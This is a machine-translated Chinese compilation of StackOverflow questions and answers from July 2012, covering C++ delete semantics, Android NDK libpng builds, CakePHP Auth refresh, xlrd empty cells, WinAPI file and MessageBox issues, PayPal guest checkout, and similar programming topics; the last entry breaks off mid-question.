# StackOverflow 问答 11603000-11603999

# c++ - 对于 C++ 中的指针，delete 命令真正对内存有什么作用？

> ID：11603005
> 
> 赞同：21
> 
> 时间：2012-07-22T18:43:08.180
> 
> 标签：c++, memory-management, new-operator

> **可能重复：**
> [C++ 删除 - 它删除了我的对象但我仍然可以访问数据？](https://stackoverflow.com/questions/1930459/c-delete-it-deletes-my-objects-but-i-can-still-access-the-data)
> [可以在其范围之外访问局部变量的内存吗？](https://stackoverflow.com/questions/6441218/can-a-local-variables-memory-be-accessed-outside-its-scope)

我不明白`delete`当我想释放分配给`new`. 在 C++ Premiere 书中写道：

> 这将删除 ps 指针指向的内存；它不会删除指针 ps 本身。例如，您可以重用 ps 来指向另一个新分配。您应该始终平衡使用 new 和使用 delete；否则，您可能会遇到内存泄漏——即，已分配但无法再使用的内存。如果内存泄漏变得太大，它可能会使寻求更多内存的程序停止。

因此，据我所知，`delete`必须删除 pinter 指向的内存中的值。但事实并非如此。这是我的实验：

```
int * ipt = new int;   // create new pointer-to-int

cout << ipt << endl;   // 0x200102a0, so pointer ipt points to address 0x200102a0
cout << *ipt << endl;  // 0, so the value at that address for now is 0\. Ok, nothing was assigned
*ipt = 1000;     // assign a value to that memory address
cout << *pt << endl;   // read the new value, it is 1000, ok
cout << *((int *) 0x200102a0) << endl;   // read exactly from the address, 1000 too

delete ipt;   // now I do delete and then check
cout << ipt << endl;  // 0x200102a0, so still points to 0x200102a0
cout << *ipt << endl;  // 1000, the value there is the same
cout << *((int *) 0x200102a0) << endl;    // 1000, also 1000 is the value 
```

那么`delete`真正做什么呢？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-07-22T18:52:54.990

把内存想象成一个大仓库，里面有很多盒子可以放东西。当您呼叫“新”时，仓库工作人员会找到一个足够大的未使用的盒子以满足您的需求，将该盒子记录为您拥有（因此它不会给其他人），并给您该盒子的编号以便您可以放置你的东西放进去。这个数字将是“指针”。

现在，当您“删除”该指针时，会发生相反的情况：仓库工作人员注意到该特定框再次可用。与真正的仓库工作人员相反，他们没有对盒子做任何事情——所以如果你在“删除”后查看它，你可能会看到你的旧东西。或者你可能会看到其他人的东西，如果盒子在此期间被重新分配。

Technically, you are not allowed to look into your box once you have returned it to the pool, but this is a somewhat weird warehouse with no keys or guards, so you can still do whatever you want. However, it might cause problems with the new owner of the box, so it's expected that you follow the rules.

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-22T18:45:46.570

`undefined behavior`只要您取消引用`delete`语句后的指针，您的实验就有。一切都可能发生，这使您的实验变得毫无价值。

`delete`（不是`delete[]`）做什么？它释放其参数指向的*存储空间。*这将触发存储在该位置的对象的析构函数运行。访问已删除的存储会触发未定义的行为（通常是`segmentation fault`）。不能保证内存实际上被交还给操作系统或其他任何东西。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-07-22T18:47:18.753

`delete`运算符释放先前使用运算符分配的内存`new`。这意味着内存现在可供系统使用，例如当`new`程序稍后有其他用途时。但是，它**不会**清除内存中的数据。指针仍将指向内存中的相同地址，但访问该块将导致未定义的行为。

最好在ing之后设置一个指向`NULL`（或`nullptr`在 C++11 中）的指针。`delete`任何后续`delete`的 s 都将是无害的。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-07-22T18:47:28.410

在 -ing之后取消引用指针`delete`是未定义的行为，因此***任何事情都可能发生***。

通常，`delete`将内存标记为已释放，以便以后可以重用，但这是一个复杂的话题。

经验法则：永远不要直接使用`new`and `delete`（除了实施`make_unique`，标准由于某种原因缺乏）；使用 RAII。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-07-22T18:48:29.313

`delete`通过 使内存可用于以后的请求`new`。它是否对内容进行加扰是未定义的。由于将内容保留原样更快，因此在释放模式下，可能会出现内存仍然“可用”。在调试模式下，它可能会被幻数打乱。

您在这里遇到的在 C++ 中称为“未定义行为”。在这种情况下，未定义的行为是由在其生命周期结束后访问一块内存引起的。只是不要这样做。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2012-07-22T18:48:14.393

`delete`将内存返回给系统——基本上，它不再为您的程序保留。这并不意味着内存中的值将立即被覆盖，但*可能*在完成后的任何时间`delete`。大多数情况下，相同的内存会重新分配给您自己的程序将来使用。

# android - 错误：png.h 没有这样的文件或目录

> ID：11603006
> 
> 赞同：1
> 
> 时间：2012-07-22T18:43:13.890
> 
> 标签：android, visual-studio-2010, libpng, native-activity

您好，我正在尝试从 PNG 文件加载纹理。我使用带有 VisualGDB 插件的 Visual Studio 2010 来运行 Android NDK。我从本机活动示例创建了项目，并尝试按照“Android NDK Begginer 指南”一书中的描述添加 libpng。我下载了 libpng 1.5.12 并将其粘贴到 $(android ndk)/sources 中。然后我用这个内容创建 Android.mk 文件：

```
LOCAL_PATH:= $(call my-dir) 
include $(CLEAR_VARS)
LS_C=$(subst $(1)/,,$(wildcard $(1)/*.c))
LOCAL_MODULE := png LOCAL_SRC_FILES := \
    $(filter-out example.c pngtest.c,$(call LS_C,$(LOCAL_PATH)))
LOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH) 
LOCAL_EXPORT_LDLIBS := -lz include $(BUILD_STATIC_LIBRARY) 
```

然后我试图在我的项目 Android.mk 文件中包含这个静态库，如下所示：

```
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)

S_CPP=$(subst $(1)/,,$(wildcard $(1)/*.cpp))
LOCAL_MODULE    := native-activity
LOCAL_SRC_FILES := 
LOCAL_LDLIBS    := -llog -landroid -lEGL -lGLESv1_CM -lpng
LOCAL_STATIC_LIBRARIES := android_native_app_glue png

include $(BUILD_SHARED_LIBRARY)

$(call import-module,android/native_app_glue)
$(call import-module,libpng) 
```

但是当我试图按照书中的描述包含 png.h 时 - 我得到了错误

```
error : png.h: No such file or directory 
```

PS Visual Studio - 看到这个文件并提供自动完成功能。

# cakephp - 更新后如何刷新 Auth 数据

> ID：11603008
> 
> 赞同：0
> 
> 时间：2012-07-22T18:43:17.030
> 
> 标签：cakephp, cakephp-1.3, cakephp-2.0

我正在工作分类控制器

这是代码

```
 public function create_add(){
          if(!empty($this->data))
         {
             if($this->Classified->save($this->data)){
               $this->User->save(array('id'=>$this->Auth->User('id'),'pending_attempts'=>$this->Auth->User('pending_attempts')-1));
             $data = $this->User->read();
             $this->Auth->login($data);
             }
            }
    } 
```

我想更新用户表中的“pending_attempts”列，例如：

未决尝试= 10；

每次运行此代码时，pending_attempts 将为 10 - 1，并且始终为 9。

仅登录时间代码工作并更新数据库后，如果我再次运行该代码 create_add() 它总是显示 pending_attempts =9

**问题**是如何刷新 Auth 数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:05:35.047

您没有更新 'pending_attempts' ，例如：

未决尝试= 10；

每次运行此代码时，pending_attempts 将为 10 - 1，并且始终为 9。

```
'pending_attempts'=>$this->Auth->User('pending_attempts')-1) 
```

查看您的代码，我认为您正在尝试更新用户身份验证会话，但我认为它不起作用：

```
$this->Auth->login($data); 
```

看看[这里](http://milesj.me/blog/read/31/Refreshing-The-Auths-Session)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-23T10:02:41.190

我尝试了许多技巧来刷新我去年所做的应用程序。但没有任何帮助。所以为什么我可以给你一个替代方案。首先使用会话中的 user_id 从表中获取数据。然后将其用作操作数据......快乐的编码兄弟......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-23T12:12:22.253

您的方法应如下所示：

```
public function create_add()
{
     if(!empty($this->data))
     {
         if($this->Classified->save($this->data))
         {
                 $user_data = $this->User->find(null, $this->Auth->User('id'));
                 $user_data['User']['pending_attempts'] -= 1;
                 $this->User->save($user_data);
                 $this->Auth->login($user_data);
         }
     }
} 
```

我检查了它，它正在工作。请询问它是否不适合您。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-23T18:41:14.667

我得到了我的问题的解决方案，该代码对我来说很好

```
public function create_add()
 {
    if(!empty($this->data))
      {
        if($this->Classified->save($this->data))
          {

         $user_data = $this->User->find('first',array('fields' => array('id','pending_attempts'),'conditions'=>array('User.id'=>$this->Auth->User('id'))));
         $this->data['User']['id'] = $this->Auth->User('id');
         $this->data['User']['pending_attempts']= $user_data['User']['pending_attempts']-1;
         $this->User->save($this->data);
       }
    }
  } 
```

# python - 使用 xlrd 库读取 Excel 文件时如何检测单元格是否为空？

> ID：11603009
> 
> 赞同：10
> 
> 时间：2012-07-22T18:43:18.940
> 
> 标签：python, excel, xlrd

**我使用函数row_values**和**col_values**处理 Excel 文件：

```
import xlrd
workbook = xlrd.open_workbook( filename )
sheet_names = workbook.sheet_names()
for sheet_name in sheet_names:
  sheet = workbook.sheet_by_name( sheet_name )    
  # ...
  row_values = sheet.row_values( rownum ) 
  # ...
  col_values = sheet.col_values( colnum ) 
```

例如，**我将 col_values 作为 list**。如果我在某列中遇到一个空单元格怎么办？例如单元格（1,1）不为空，单元格（1,2）为空，单元格（1,3）不为空？如何检测单元格 (1,2) 为空？

我得到一个带有空字符串的列表作为空单元格的值，这是真的吗（对于大多数生成 Excel 文件的知名程序）？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-22T20:30:04.410

您可以明确并检查，`sheet.cell_type(rowno, colno) in (xlrd.XL_CELL_EMPTY, xlrd.XL_CELL_BLANK)`但文档声明该值`u''`无论如何都会是这种情况。

除了 using `row_values`，您还可以使用`row(n)`which 返回具有和属性的`Cell`对象列表。`.value``.cell_type`

# ruby-on-rails - Rails 3.2 时间列不保存（Simple_Form）

> ID：11603012
> 
> 赞同：0
> 
> 时间：2012-07-22T18:43:32.367
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2, simple-form

我无法将数据保存到时间字段中。我发现该数据已提交，并且参数数组中有以下内容。

```
timefield_datetime(1i) => "",
timefield_datetime(2i) => "",
timefield_datetime(3i) => "",
timefield_datetime(4i) => "2",
timefield_datetime(5i) => "3" 
```

应该节省的是02小时03分钟。

当它创建 SQL 查询时，它会忽略该字段。在插入语句中，它插入 Null，并且在更新时忽略该字段。

数据库中的列定义为时间字段。

我还使用 simple_form 进行表单渲染，并将字段设置为：

```
f.input :timefield, :include_blank => true, :as => :time 
```

我尝试将该列设置为:datetime，但仍然无法保存数据，除非我删除:as => :time，并且必须提交日期时间字段的所有部分。

任何想法为什么我不能只提交并保存时间字段？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T23:39:45.587

我使用的rails版本是3.2.0，当前稳定版本是3.2.6。

这是 3.2.0 中的一个错误，已在 3.2.0 -> 3.2.6 的其中一个版本中修复

# winapi - 使用 WINAPI 的 ReadFile 或类似的东西读取文件的一部分？

> ID：11603013
> 
> 赞同：0
> 
> 时间：2012-07-22T18:43:32.517
> 
> 标签：winapi, visual-c++

好吧，我正在做一个项目，在这个项目中，我正在处理潜在的大文件，我无法一次将它们全部加载到内存中，所以我将把它们当作 CHS 硬盘驱动器，并抓取数据一次一个 0x800 字节的块。

我的问题是，我在 WINAPI 中找不到任何允许我从使用 CreateFile 打开的文件中读取数据的函数，从偏移量开始。

是的，它必须是一个 WINAPI 函数，不，我不想将整个文件映射到内存中。

非常感谢，布拉德利。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T18:47:27.233

[`ReadFile`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365467%28v=vs.85%29.aspx)与_[`SetFilePointer`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365541%28v=vs.85%29.aspx)

# cookies - Cookie 中的 CSRF 令牌

> ID：11603014
> 
> 赞同：1
> 
> 时间：2012-07-22T18:43:42.483
> 
> 标签：cookies, csrf

关于 CSRF 代币的一般建议是什么。

在 cookie 中包含 csrf 令牌是否安全？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T18:59:56.090

这个问题已经被问及并得到了回答。请参阅[CSRF：我可以使用 cookie 吗？](https://stackoverflow.com/questions/4463422/csrf-can-i-use-a-cookie?rq=1 "CSRF：我可以使用 cookie 吗？")

# c# - 如何在 C# 中旋转一组键和数组？

> ID：11603016
> 
> 赞同：1
> 
> 时间：2012-07-22T18:43:47.720
> 
> 标签：c#, dictionary

假设我有一组小数的字符串键，如下所示：

```
{ "Alfred", [1, 2] }
{ "Batman", [1, 2, 3] } 
```

如何在 C# 中轻松地将这种关系反转到集合所在的位置：

```
{ 1, ["Alfred", "Batman"] }
{ 2, ["Alfred", "Batman"] }
{ 3, ["Batman" ] } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T18:57:54.567

您可以使用 LINQ：

```
var d = new Dictionary<string,int[]>{
    {"Alfred", new[] {1,2}}
,   {"Batman", new[] {1,2,3}}
};
var res = d
    .SelectMany(p=>p.Value.Select(v => new {p.Key, Value = v}))
    .GroupBy(p => p.Value)
    .ToDictionary(g => g.Key, g => g.Select(v => v.Key).ToArray());
foreach (var p in res)
    Console.WriteLine("{0} = ({1})", p.Key, string.Join(", ", p.Value)); 
```

此代码产生此输出（[ideone link](http://ideone.com/e378P)）：

```
1 = (Alfred, Batman)
2 = (Alfred, Batman)
3 = (Batman) 
```

`g => g.Key`注意和之间的区别`g => g.Select(v => v.Key)`：前者选择*组*的键，而后者选择*原始字典*的键。

# c# - 将 Visual Studio C# Express 与 Dropbox 结合使用时缺少引用？

> ID：11603017
> 
> 赞同：1
> 
> 时间：2012-07-22T18:43:49.987
> 
> 标签：c#, visual-studio-2010, dropbox

我的同事在 Dropbox 文件夹中保存了一个 Visual Studio C# express 项目，我从这个文件夹中打开了它。我们添加了[引用路径](http://msdn.microsoft.com/en-us/library/6taasyc6%28v=vs.80%29.aspx)，但仍然无法识别某些命名空间。我们应该怎么做，是否可以通过项目的 Dropbox 一起工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:09:16.627

我们解决此问题的方法是将应用程序所需的所有外部非框架程序集包含在相对于项目的子文件夹中，然后在引用程序集时，我们编辑 csproj 文件并确保程序集引用是相对的而不是绝对的。

例如：

```
Solution Folder
  Assemblies
    MyAssembly.dll

  Project Folder
    MyProject.csproj

  MyProject.sln 
```

如果 MyProject.csproj 有对 MyAssembly.dll 的引用，那么 csproj 中的引用将类似于：

```
<Reference Include="MyAssembly">
  <HintPath>..\Assemblies\MyAssembly.dll</HintPath>
</Reference> 
```

这种做法可确保所有项目始终使用完全相同的 DLL 集构建和测试，并且不受每个开发人员机器上安装的不同更新的影响。

# magento - 如何根据某些条件在订单小计中添加一定的百分比税？

> ID：11603018
> 
> 赞同：0
> 
> 时间：2012-07-22T18:43:49.937
> 
> 标签：magento

我正在工作的 Magento 商店有自定义订单向导，您可以在其中使用类似向导的步骤选择产品，最后将商品添加到购物车中。
客户希望在使用此向导放置的购物车物品的小计中添加一定的税费或附加费。

谁能推荐在小计中增加额外费用的正确方法？

提前致谢！

# jquery - Jquery多个切换 - 继续动画错误

> ID：11603022
> 
> 赞同：0
> 
> 时间：2012-07-22T18:44:46.523
> 
> 标签：jquery, toggle, slidetoggle, bbcode

我试图让破坏者在使用 BBCode 的论坛上工作。这是我目前正在使用的代码：

```
<script type="text/javascript">
$(document).ready(function(){ 

$('.toggle_container').hide();

$('h5.trigger').click(function(){
   $(this).next().slideToggle('slow');
return false;
});

});
</script>

<div class="spoiler">
<h5 class="trigger"><a href="#">Show</a></h5>
<div class="toggle_container">
<div class="block">
    {param}
</div>
</div>
</div> 
```

基本上，如果页面上只显示一个剧透，这会很好。但是，如果说两个在一个页面上，动画会显示然后隐藏。如果页面上有三个，则动画将运行 3 次（显示、隐藏、显示）。我怎样才能做到这一点，无论页面上有多少扰流板，扰流板只打开或关闭一次。

# python - Python - 解析难题

> ID：11603024
> 
> 赞同：0
> 
> 时间：2012-07-22T18:45:03.810
> 
> 标签：python, parsing, csv

我已经到处寻找解决这种情况的方法，并测试了几种不同的方法，但到目前为止我还没有运气。基本上，我有一个包含以下格式数据的文件，需要将其转换为 CSV：

```
(previously known as CyberWay Pte Ltd)
0 2019
01.com
0 1975
1 TRAVEL.COM
0 228
1&1 Internet
97 606
1&1 Internet AG
0 1347
1-800-HOSTING
0 8
1Velocity
0 28
1st Class Internet Solutions
0 375
2iC Systems
0 192 
```

我已经尝试使用 re.sub 并用逗号替换每隔一行的数字之间的空格，但到目前为止还没有成功。我承认我通常*从*CSV 解析，所以原始文本对我来说有点挑战。我需要维护每组数字上方的字符串格式。

我希望将 CSV 格式化为：

```
foo bar
0,8
foo bar
0,9
foo bar
0,10
foo bar
0,11 
```

大约有 50,000 个条目，因此手动编辑这将花费大量时间。

如果有人有任何建议，我将不胜感激。

非常感谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T18:50:32.633

如果您只想用逗号替换空格，您可以这样做：

```
line = ','.join(line.split()) 
```

您只需要在其他每一行上执行此操作，但从您的问题来看，您似乎已经知道如何与其他每一行一起工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T18:54:22.447

如果我正确理解了您的要求，则您需要在所有行上使用 strip() 并在偶数行（从 1 开始的行）上基于空格进行拆分：

```
import re

fp = open("csv.txt", "r")
while True:
    line = fp.readline()
    if '' == line:
            break
    line    = line.strip()
    fields  = re.split("\s+", fp.readline().strip())
    print "\"%s\",%s,%s" % ( line, fields[0], fields[1] )
fp.close() 
```

输出是 CSV（如果引号出现在您的输入中，您可能需要对其进行转义）：

```
"Content of odd line",Number1,Number2 
```

不过，我不明白您在示例的奇数行上作为标题放置的 'foo,bar'。

# javascript - angularJS 文档中的各种术语是什么意思？

> ID：11603030
> 
> 赞同：1
> 
> 时间：2012-07-22T18:45:59.987
> 
> 标签：javascript, rest, web-applications, javascript-framework, angularjs

（这里给出的 API 参考：http: [//docs.angularjs.org/api](http://docs.angularjs.org/api)分为几个模块。每个模块都有它的一组指令、服务、过滤器。

我想知道**这些术语（即指令、服务、模块等）是什么*意思*，它们在使用 angularJS 制作的典型网络应用程序中将扮*演什么角色***？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-22T18:54:50.233

“服务”在[https://docs.angularjs.org/guide/services](https://docs.angularjs.org/guide/services)进行了解释。

> Angular 服务是使用依赖注入 (DI) 连接在一起的可替代对象。您可以使用服务在您的应用程序中组织和共享代码。

“指令”在[http://docs.angularjs.org/guide/directive](http://docs.angularjs.org/guide/directive)进行了解释。

> 指令是一种教授 HTML 新技巧的方法。在 DOM 编译期间，指令与 HTML 匹配并执行。这允许指令注册行为，或转换 DOM。

“模块”在[http://docs.angularjs.org/guide/module](http://docs.angularjs.org/guide/module)进行了解释。

> 大多数应用程序都有一个 main 方法来实例化、连接和引导应用程序。Angular 应用程序没有 main 方法。相反，模块以声明方式指定应如何引导应用程序。

我只是在这个答案中包含摘要。您可能需要更多详细信息，在这种情况下，请点击链接并查看文档。

# php - PEAR 没有给出 CLI 的输出

> ID：11603031
> 
> 赞同：0
> 
> 时间：2012-07-22T18:46:11.127
> 
> 标签：php, macos, osx-lion, pear, mamp

我正在尝试运行

> /Applications/MAMP/bin/php/php5.4.3/bin/pear

从 Mac OS X Lion 上的终端。我没有得到任何输出，使用`-h`, `-v`，`-V`也`version`没有给出任何输出。

也没有错误。

我在 Mac OS X Lion 上运行 MAMP，两者都是全新安装。

**有点跑题了**

我对此一无所知， PEAR 从来**没有**第一次工作过，也从来没有像我可以信任的那样可靠地获取/更新库的平台。为什么它仍然存在？对于像 Propel ORM 这样的新库，正确安装像 Phing 这样的东西似乎也是一个要求。

让 Propel 工作是我的最终目标。但是为什么哦为什么我还要使用 PEAR，它又旧又垃圾！

感谢您的帮助，杰克

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T18:57:19.560

有错误但不显示。
确保在您的 php.ini 中具有以下设置：

```
display_errors = On
display_startup_errors = On
error_reporting = E_ALL 
```

# paypal - 贝宝付款标准客人结帐

> ID：11603036
> 
> 赞同：0
> 
> 时间：2012-07-22T18:46:48.893
> 
> 标签：paypal, paypal-sandbox

我将一个 MVC4 网站与 Paypal 集成在一起，到目前为止一切都很顺利。但是，当我点击时，买家没有以访客身份完成购买的选项。我正在使用 Paypal HTML 支付标准方法并四处搜索，[此](https://stackoverflow.com/questions/8529209/paypal-standard-not-giving-option-for-check-out-as-guest)页面和[Paypal 本身](https://www.paypal.com/uk/cgi-bin/webscr?cmd=xpt/cps/general/OptionalAccount-outside)说要确保我的个人资料中的“帐户可选”已关闭。我现在在我的沙盒配置文件中，但在“网站支付偏好”下没有这样的选项。我只有：

*   网站付款自动退货
*   支付数据转换
*   加密网站支付
*   联系电话号码
*   快速结帐设置（仅适用于德国付款方式！）

有谁知道这个设置现在在哪里？我正在构建站点的人不希望用户必须拥有贝宝帐户，因此需要访客结帐功能。不幸的是，Paypal 网站并没有真正的帮助——搜索客人结帐的次数很少。

任何帮助都非常感谢。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T01:41:04.673

确保收款账户具有已**验证**状态（例如，您已将其与银行账户相关联）。

只有经过验证的帐户才有资格进行访客结帐。另一个常见的陷阱是您可能在收件人的电子邮件地址上打错了字。

确保它与用于登录 PP 帐户的完全相同（或至少它已关联并与该帐户确认）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-28T10:57:36.820

这个主题论坛是我找到的在贝宝上接收客人付款的要求清单的最佳地点： [https ://www.paypal-community.com/t5/How-to-use-PayPal-Archive/buy-now -button-requires-paypal-login-or-account/mp/15587](https://www.paypal-community.com/t5/How-to-use-PayPal-Archive/buy-now-button-requires-paypal-login-or-account/m-p/15587)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-23T00:17:54.437

我遇到了同样的问题，我想这可能与您的位置或您的客户位置（美国以外）有关。

我已经打电话给 PayPal 支持，经过大约一个小时的讨论，他们说了类似的话。

我希望这不是正确的答案（我希望我们可以做一些设置来改变它，而我们只是错过了它）。

还检查它可能有帮助的链接： [PayPal Standard not give option for Check out as Guest](https://stackoverflow.com/questions/8529209/paypal-standard-not-giving-option-for-check-out-as-guest)

# vim - 我想打开 vim 并查看我之前会话中的 ":" 命令。那可能吗？

> ID：11603044
> 
> 赞同：7
> 
> 时间：2012-07-22T18:47:44.243
> 
> 标签：vim, ubuntu, command

当我在 vim 中打开文件时，我通常会反射性地按下冒号以查看先前命令的列表，但它是空的。如何获取我以前的命令历史记录。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-22T18:49:51.870

`:history`应该做你想做的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-29T08:06:38.183

`q:`会更好。它将显示命令列表，您可以按`j`或`k`进行运动，然后`enter`运行选定的命令。

# android - SharedPreferences.Editor commit() 是否只写回所做的更改或整个首选项集？

> ID：11603046
> 
> 赞同：2
> 
> 时间：2012-07-22T18:48:01.293
> 
> 标签：android, sharedpreferences, android-preferences

当您在 SharedPreferences.Editor 上调用 commit 时，它是只写回已更改的值，还是写回与其链接的 SharedPreference 对象中的所有值，无论它们是否已更改？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T18:57:45.597

从[文档中](http://developer.android.com/reference/android/content/SharedPreferences.Editor.html#commit%28%29)：

> 将您的首选项**更改**从该编辑器提交回它正在编辑的 SharedPreferences 对象。这会自动执行请求的**修改**，替换 SharedPreferences 中当前的任何内容。

似乎表明数据仅被修改，如果相同，则不会被覆盖。但请记住，多次调用`commit()`只会产生一个更改（最后一个更改）。

# android - 如何用全屏图像暂时遮盖 WebView？

> ID：11603048
> 
> 赞同：0
> 
> 时间：2012-07-22T18:48:08.457
> 
> 标签：android, webview, android-webview, android-resources

在 WebView 中显示（本地）图像很[简单](https://stackoverflow.com/a/6134462)。

但这意味着它必须适合我的标准 WebView 框架（例如减去标题栏）。

在将任何页面或 URL 加载到 WebView 之前，我可以简单地通过执行以下操作来实现：

```
myWebView.setBackgroundColor(0);
myWebView.setBackgroundResource(R.drawable.myImage); 
```

但是***在***某些页面被加载和渲染之后，上面的技巧就不再起作用了。

有没有办法用全屏图像掩盖 WebView？（当然，在加载新的 HTML 页面或 URL 之前）

**注意：**我对[webview.loadUrl()解决方案](https://stackoverflow.com/q/6127696)*不*感兴趣。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:41:09.397

您可以设置自己的`WebViewClient`反对`WebView`并让它覆盖以下两种方法：

*   [onPageStarted（WebView 视图、字符串 url、位图图标）](http://developer.android.com/reference/android/webkit/WebViewClient.html#onPageStarted%28android.webkit.WebView,%20java.lang.String,%20android.graphics.Bitmap%29)
*   [onPageFinished（WebView 视图，字符串 url）](http://developer.android.com/reference/android/webkit/WebViewClient.html#onPageFinished%28android.webkit.WebView,%20java.lang.String%29)

然后，当页面开始加载时，将您的图像（您覆盖在例如 an 中`ImageView`）切换为可见。加载页面完成后，将其重新设置为`invisible`或`gone`。这将在每次加载页面时起作用`WebView`。

# c - winprog.org 第一个例子奇怪的行为？

> ID：11603049
> 
> 赞同：1
> 
> 时间：2012-07-22T18:48:10.190
> 
> 标签：c, winapi, user-interface

我说的是 winprog.org 的 windows GUI 教程，因为 StackO 上的许多用户都推荐它。

我基本上试过这个例子：

```
#include "stdafx.h"
#include "winapiTest1.h"

int WINAPI _tWinMain(HINSTANCE hInstance,
        HINSTANCE hPrevInstance,
        LPTSTR    lpCmdLine,
        int       nCmdShow)
{
    MessageBox(NULL, (LPCWSTR) "Goodbye, cruel world!", (LPCWSTR) "Note", MB_OK);
    return 0;
} 
```

但是当我运行它时，它会显示消息框，但其中的每个字符串（甚至是标题）都以**汉字**表示。

似乎是什么问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T18:53:53.443

> 但是当我运行它时，它会显示消息框，但其中的每个字符串（甚至标题）都以汉字表示。

原因是操作系统将您的字符串文字解释为好像它们是使用[UTF-16](http://en.wikipedia.org/wiki/UTF-16)编码的，即使它们不是。

像这样的一些标识符`MessageBox()`有两种形式：一个`MessageBoxA()`函数和一个`MessageBoxW()`. `MessageBoxA()`是接受以当前代码页编码的字符串的“ANSI”版本，`MessageBoxW()`是接受以 UTF-16 编码的字符串的“宽”版本（即它是“Unicode-aware”）。`MessageBox()`实际上是一个宏，根据是否定义了宏来定义其中之一`UNICODE`。Windows API 中没有被调用的实际`MessageBox()` *函数*。

问题的症结在这里：

```
MessageBox(NULL, (LPCWSTR) "Goodbye, cruel world!", (LPCWSTR) "Note", MB_OK); 
```

您的项目可能有一个`#define UNICODE`地方，导致`MessageBox()`标识符解析为`MessageBoxW()`，它需要一个 UTF-16 编码的字符串。通常，编译器会向您抱怨它（即编译错误），但`LPCWSTR`强制转换本质上会关闭编译器并强制它编译。

您不能只是随机投掷并总是期望它起作用。不幸的是，很多 Windows API 教程（以及一些一般的 C++ 教程）在不必要甚至不合适的时候到处滥用。

[James 提出](https://stackoverflow.com/a/11603068/308661)的解决方案使用`_T()`宏，这有助于对其进行设置，以便正确编码字符串文字，而无需强制转换。但是，对于新应用程序来说，一个更好的解决方案是忘记函数的 ANSI 版本，而一直使用 Unicode。该`_T()`宏是过渡到 Unicode 感知 API 的应用程序的权宜之计。

```
#include "stdafx.h"   // Make sure UNICODE is defined before windows.h       
#include "winapiTest1.h"          

int WINAPI WinMain(HINSTANCE hInstance,          
        HINSTANCE hPrevInstance,          
        LPCSTR    lpCmdLine,          
        int       nCmdShow)          
{          
    MessageBox(NULL, L"Goodbye, cruel world!", L"Note", MB_OK);          
    return 0;          
} 
```

请注意，字符串文字现在有一个`L`前缀。这告诉 Visual C++ 编译器将文字解释为 UTF-16 编码字符串（请注意，它可能会在其他 C++ 编译器上将其转换为不同的编码；这仅适用于 Visual C++）。

另请注意，上述建议仅适用于仅使用 Windows API 时。一些包装 Windows API 的框架和库有自己的处理 Unicode 字符串的规定。如果您使用的是框架/库，请遵循这些。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T18:50:06.767

尝试：

```
MessageBox(NULL, _T("Goodbye, cruel world!"), _T("Note"), MB_OK); 
```

# facebook - Facebooks 分享者拒绝 goo.gl 链接

> ID：11603056
> 
> 赞同：2
> 
> 时间：2012-07-22T18:48:29.533
> 
> 标签：facebook, hyperlink, share, short

我正在开发一个 Android html5 应用程序，我想在 Facebook 上分享一个长 URL，例如：

> http://api.myserver.com/share.php?key=[MD5 HASH]

所以我首先尝试：

> https://m.facebook.com/sharer.php?u=http://api.myserver.com/share.php?key=[MD5 HASH]

（将长链接 URL 编码为参数）但它不起作用，它说：找不到链接。

我认为这可能与包含链接的长 MD5 哈希有关，所以我使用 goo.gl API 来缩短它。它返回一个字符串，如：

> [http://goo.gl/xxxxx](http://goo.gl/xxxxx)

我已经测试了 Google API 返回的缩短链接，并且它们存在。所以我再次尝试使用 Facebook：

> [http://m.facebook.com/sharer.php?u=http://goo.gl/xxxxx](http://m.facebook.com/sharer.php?u=http://goo.gl/xxxxx)

但同样的事情再次发生。

为什么会这样？我尝试使用 goo.gl 缩短一些 Instagram 网址（例如），然后......猜猜怎么着？它适用于脸书！

我真的不明白我的网址有什么问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T18:51:37.597

您所要做的就是对要作为参数传递的 url 进行编码。

在 javascript 中，您可以使用 encodeURIComponent 来执行此操作。

事实上，由于 URL / URI 规范，您第一次尝试的结果是哈希被视为 facebook 的共享者 url 的参数。

必须对通过 url 传递的不同数据进行“url 编码”。

# coldfusion - ScaleMin 不适用于 cf 9 中的 cf 图表

> ID：11603057
> 
> 赞同：0
> 
> 时间：2012-07-22T18:48:46.660
> 
> 标签：coldfusion, coldfusion-9, cfchart

我正在 CF 9 中创建折线图。我的 cfchart 代码如下：

```
 <cfchart showborder="yes"
    chartheight="500" chartwidth="1000"
